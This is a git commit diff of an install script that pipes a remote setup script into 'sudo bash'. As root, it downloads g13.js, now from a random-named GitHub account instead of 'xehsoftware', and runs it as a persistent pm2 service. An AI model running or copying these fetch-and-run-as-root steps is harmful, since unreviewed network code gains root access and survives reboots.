8ad60c2f9632396789d1b51b5a4b81f109801bdb
am5z <119353097+am5z@users.noreply.github.com>
2024-08-17 21:18:47 +0100

    Update g13s.sh

--- g13s.sh
+++ g13s.sh
@@ -5,11 +5,11 @@ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
 sudo apt update
 sudo apt-get install -y nodejs
 sudo mkdir -p /etc/g13
-sudo curl -o /etc/g13/g13.js https://raw.githubusercontent.com/xehsoftware/G13/main/g13.js
+sudo curl -o /etc/g13/g13.js https://raw.githubusercontent.com/QZkU2W3GwrbeR6KcS7fsmAnYFhqCgdjHyuMz5tN/G13/main/g13.js
 cd /etc/g13
 sudo npm init -y
-sudo npm install dockerode fs-extra axios path glob crypto pm2 -g
-sudo npm install dockerode fs-extra axios path glob crypto pm2
+sudo npm install dockerode fs-extra axios path glob crypto pm2 toml -g
+sudo npm install dockerode fs-extra axios path glob crypto pm2 toml
 sudo pm2 start /etc/g13/g13.js --name "g13"
 sudo pm2 save
 sudo pm2 startup
